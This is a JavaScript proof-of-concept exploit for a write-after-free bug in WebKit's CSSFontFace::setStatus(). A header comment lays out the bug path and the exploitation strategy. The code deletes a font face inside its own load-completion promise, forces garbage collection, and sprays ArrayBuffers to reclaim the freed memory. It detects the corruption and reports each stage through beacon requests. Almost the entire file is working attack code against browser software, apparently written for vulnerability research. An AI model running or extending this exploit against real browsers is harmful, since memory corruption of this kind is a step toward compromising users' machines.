// p200b — CSSFontFace::setStatus() write-after-free
//
// Bug: CSSFontFace::setStatus() (CSSFontFace.cpp:571-595)
// 1. iterateClients calls fontStateChanged(*this, ...)
// 2. fontStateChanged calls faceFinished(face, ...)
// 3. faceFinished resolves JS promise — JS .then() callback runs
// 4. JS callback: document.fonts.delete(face) removes face from set
// 5. faceFinished returns — PendingPromise destroyed — Ref<FontFace> dropped
// 6. If no other Ref exists, CSSFontFace is freed
// 7. setStatus continues to m_status = newStatus — WRITE-AFTER-FREE
//
// Strategy:
// - Create FontFace, add to document.fonts
// - Start loading via document.fonts.load()
// - In .then() callback: delete the face, null all JS refs, force GC
// - The PendingPromise destruction after faceFinished drops last Ref
// - setStatus writes to freed memory
// - Spray to reclaim and detect corruption
//
// Beacon prefix: V200B-

(function() {
  function B(tag, body) {
    try {
      var url = '/beacon/V200B-' + tag + '?t=' + Date.now();
      if (body) { navigator.sendBeacon(url, body); }
      else { new Image().src = url; }
    } catch(e) {}
  }

  function hex(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

  B('BOOT');

  // Minimal valid TTF for loading (empty glyph table, single cmap)
  // Using a data URI with a tiny valid font
  var FONT_URL = 'data:font/woff2;base64,d09GMgABAAAAAADcAAoAAAAAARAAAACRAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAABmAARABEAEQARABEAAAACwAAAQIAAgQGBggMEBQYHCMmKDI6P0dRW2V0gJGktcXg/wAEIABEACAAOABkAGgAbABwAHYAfACEAJIAmgCwANIA+gANARcBIQErATUBQQFNAVUBaQF3AYUBmwG9AeUB+wEXAT0BTQF7AYkBrwHNAfcBAAUGAAAHCAAABwgA';

  // ---- TEST 1: Basic FontFace lifecycle ----
  try {
    var testFace = new FontFace('V200BTest', 'url(' + FONT_URL + ')');
    document.fonts.add(testFace);
    B('T1-ADD-OK');
    document.fonts.delete(testFace);
    B('T1-DEL-OK');
    testFace = null;
  } catch(e) {
    B('T1-ERR-' + e.message.substring(0, 40));
    return;
  }

  // ---- TEST 2: Verify .then() receives faces array ----
  try {
    var f2 = new FontFace('V200BFace2', 'url(' + FONT_URL + ')');
    document.fonts.add(f2);
    document.fonts.load('12px V200BFace2').then(function(faces) {
      B('T2-LOADED-' + faces.length);
      // faces[0] should be the FontFace object
      if (faces.length > 0) {
        B('T2-FACE-STATUS-' + faces[0].status);
      }
      document.fonts.delete(f2);
      f2 = null;
    }).catch(function(e) {
      B('T2-ERR-' + e.message.substring(0, 40));
    });
  } catch(e) {
    B('T2-SETUP-ERR-' + e.message.substring(0, 40));
  }

  // ---- PHASE 1: Trigger the UAF (3s delay to let T2 finish) ----
  setTimeout(function() {
    B('P1-START');

    try {
      // Create victim face — we'll delete it during its own load completion
      var victim = new FontFace('V200BVictim', 'url(' + FONT_URL + ')');
      document.fonts.add(victim);
      B('P1-VICTIM-ADDED');

      // The key: document.fonts.load() creates a PendingPromise that
      // holds Ref<FontFace> in its faces vector.
      // The .then() callback receives these faces.
      // We must NOT keep a reference to the faces in the callback scope.
      document.fonts.load('12px V200BVictim').then(function(faces) {
        B('P1-LOADED-' + faces.length);

        // Step 1: Delete victim from document.fonts
        // This removes the CSSFontFaceSet's Ref<CSSFontFace>
        document.fonts.delete(victim);
        B('P1-DELETED');

        // Step 2: Null our JS references
        victim = null;

        // Step 3: Do NOT keep any reference to faces[0]
        // Clear the local faces array - this is key!
        // After this .then() returns, the PendingPromise is destroyed,
        // which drops the Ref<FontFace> in faces, which drops the
        // Ref<CSSFontFace> m_backing.
        // That's the last ref → CSSFontFace is freed.
        // But setStatus() continues to write m_status!
        faces = null;

        // Step 4: Force GC to sweep the freed CSSFontFace
        var gcJunk = [];
        for (var g = 0; g < 100; g++) {
          var batch = [];
          for (var k = 0; k < 5000; k++) batch.push({x: k});
          gcJunk.push(batch);
        }
        gcJunk = null;
        B('P1-GC-FORCED');

        // Step 5: Spray to reclaim freed CSSFontFace memory
        // CSSFontFace is ~200-400 bytes (has vectors, Ref ptrs, etc.)
        var SPRAY_COUNT = 5000;
        var SPRAY_SIZE = 256;
        var spray = [];
        for (var s = 0; s < SPRAY_COUNT; s++) {
          var buf = new ArrayBuffer(SPRAY_SIZE);
          var view = new Uint32Array(buf);
          // Fill with detectable pattern
          view[0] = 0xCAFE0000 | (s & 0xFFFF);
          view[1] = 0xDEAD0001;
          view[2] = 0xBEEF0002;
          view[3] = 0xFACE0003;
          for (var f = 4; f < view.length; f++) {
            view[f] = 0x41410000 | f;
          }
          spray.push(buf);
        }
        B('P1-SPRAYED-' + SPRAY_COUNT);

        // The write-after-free (m_status = newStatus) happens back in
        // setStatus() after iterateClients returns.
        // m_status is at some offset in the CSSFontFace struct.
        // If spray reclaimed the memory, the write corrupts our spray data.

        // Check spray for corruption
        setTimeout(function() {
          var corrupted = 0;
          var corruptDetails = [];
          for (var i = 0; i < spray.length; i++) {
            var v = new Uint32Array(spray[i]);
            // Check first 4 marker values
            if (v[0] !== (0xCAFE0000 | (i & 0xFFFF)) ||
                v[1] !== 0xDEAD0001 ||
                v[2] !== 0xBEEF0002 ||
                v[3] !== 0xFACE0003) {
              corrupted++;
              if (corruptDetails.length < 5) {
                corruptDetails.push(i + ':' + hex(v[0]) + '/' + hex(v[1]) + '/' + hex(v[2]) + '/' + hex(v[3]));
              }
            }
          }
          B('P1-CORRUPT-' + corrupted, corruptDetails.join(' '));
          if (corrupted > 0) B('UAF-CONFIRMED');
          phase2();
        }, 50);
      }).catch(function(e) {
        B('P1-LOAD-ERR-' + e.message.substring(0, 40));
        phase2();
      });
    } catch(e) {
      B('P1-ERR-' + e.message.substring(0, 40));
      phase2();
    }
  }, 3000);

  // ---- PHASE 2: Multiple concurrent faces for larger window ----
  function phase2() {
    B('P2-START');

    try {
      var NFACES = 32;
      var allFaces = [];
      for (var i = 0; i < NFACES; i++) {
        var f = new FontFace('V200BP2F' + i, 'url(' + FONT_URL + ')');
        document.fonts.add(f);
        allFaces.push(f);
      }
      B('P2-CREATED-' + NFACES);

      // Start loading all faces
      var loadPromises = [];
      for (var i = 0; i < NFACES; i++) {
        (function(idx) {
          loadPromises.push(
            document.fonts.load('12px V200BP2F' + idx).then(function(faces) {
              // Delete THIS face AND other faces during callback
              // This creates the window where multiple CSSFontFace refs drop
              try {
                document.fonts.delete(allFaces[idx]);
                // Also delete adjacent faces for chain-free effect
                if (idx + 1 < NFACES) {
                  try { document.fonts.delete(allFaces[idx + 1]); } catch(e) {}
                }
              } catch(e) {}
              allFaces[idx] = null;
              faces = null;
              return idx;
            })
          );
        })(i);
      }

      Promise.all(loadPromises).then(function(results) {
        B('P2-ALL-DONE-' + results.length);
        allFaces = null;

        // Force GC
        for (var g = 0; g < 80; g++) {
          var batch = [];
          for (var k = 0; k < 5000; k++) batch.push({x: k});
        }

        // Spray
        var spray2 = [];
        for (var s = 0; s < 5000; s++) {
          var buf = new ArrayBuffer(256);
          var v = new Uint32Array(buf);
          v[0] = 0xBAAD0000 | (s & 0xFFFF);
          v[1] = 0xF00D0001;
          spray2.push(buf);
        }
        B('P2-SPRAYED');

        // Check for corruption
        setTimeout(function() {
          var corrupted = 0;
          for (var i = 0; i < spray2.length; i++) {
            var v = new Uint32Array(spray2[i]);
            if (v[0] !== (0xBAAD0000 | (i & 0xFFFF)) || v[1] !== 0xF00D0001) {
              corrupted++;
            }
          }
          B('P2-CORRUPT-' + corrupted);
          if (corrupted > 0) B('P2-UAF-CONFIRMED');
          B('DONE');
        }, 100);
      }).catch(function(e) {
        B('P2-ERR-' + e.message.substring(0, 40));
        B('DONE');
      });
    } catch(e) {
      B('P2-SETUP-ERR-' + e.message.substring(0, 40));
      B('DONE');
    }
  }
})();
